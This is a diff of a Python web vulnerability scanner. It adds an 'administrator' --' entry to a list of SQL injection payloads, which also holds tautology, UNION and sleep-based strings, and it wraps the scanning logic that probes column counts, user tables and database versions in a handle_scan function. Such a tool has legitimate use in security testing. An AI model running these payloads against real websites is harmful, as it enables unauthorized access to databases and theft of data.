@@ -571,6 +571,7 @@ def exploit_sqli(url):
         "' OR 'a'='a' --",
         "1 OR 1=1",
         "admin' --",
+        "administrator' --",
         "' UNION SELECT NULL, NULL --",
         "[Nothing]", 
         " ' or sleep(1) or '",
@@ -640,9 +641,19 @@ def exploit_sqli_column_number(url):
             print(f"[-] Request error en {target_url}: {e}")
             return False
     return False
+def handle_scan():
+    """
+    Handles the process of scanning a base URL for potential SQL Injection and XSS vulnerabilities.
 
-if __name__ == "__main__":
-    
+    - Prompts the user for a base URL.
+    - Retrieves and tests different URL paths with parameters for vulnerabilities.
+    - Checks each discovered URL for SQL Injection vulnerabilities, 
+      including checking the number of columns in the database and user tables.
+    - Optionally checks for XSS vulnerabilities (commented out in current version).
+
+    Returns:
+        None
+    """
     base_url = input("Enter the URL you want to scan: ").strip()
     base_url = base_url.rstrip('/')
 
@@ -650,7 +661,6 @@ if __name__ == "__main__":
     urls_to_test = find_urls_to_test(base_url, base_url)
 
     if urls_to_test:
-        # print("[+] Found the following URLs with parameters:")
         for url in urls_to_test:
             print(url)
 
@@ -664,16 +674,22 @@ if __name__ == "__main__":
             if not is_vulnerable:
                 num_col = exploit_sqli_column_number(test_url)
                 if num_col:
-                    #print(f"[+] Vulnerable URL found: {test_url}")
                     print(Fore.GREEN + f"[+] We determined that your database has {num_col} columns at this URL, as the server did not handle exceptions properly during the SQL query.")
                 else:
-                    print("[-] URL not vulnerable to sql injection")
+                    print("[-] URL not vulnerable to SQL injection")
             
             exploit_sqli_users_table(test_url)
             exploit_database_version(test_url)
             
-            exploit_xss_url(test_url)
-            submit_xss_payloads_to_forms(test_url)
+            # Uncomment these to test for XSS vulnerabilities
+            # exploit_xss_url(test_url)
+            # submit_xss_payloads_to_forms(test_url)
             
     else:
         print("[-] No URLs with parameters found.")
+        
+if __name__ == "__main__":
+    
+    handle_scan()
+
+
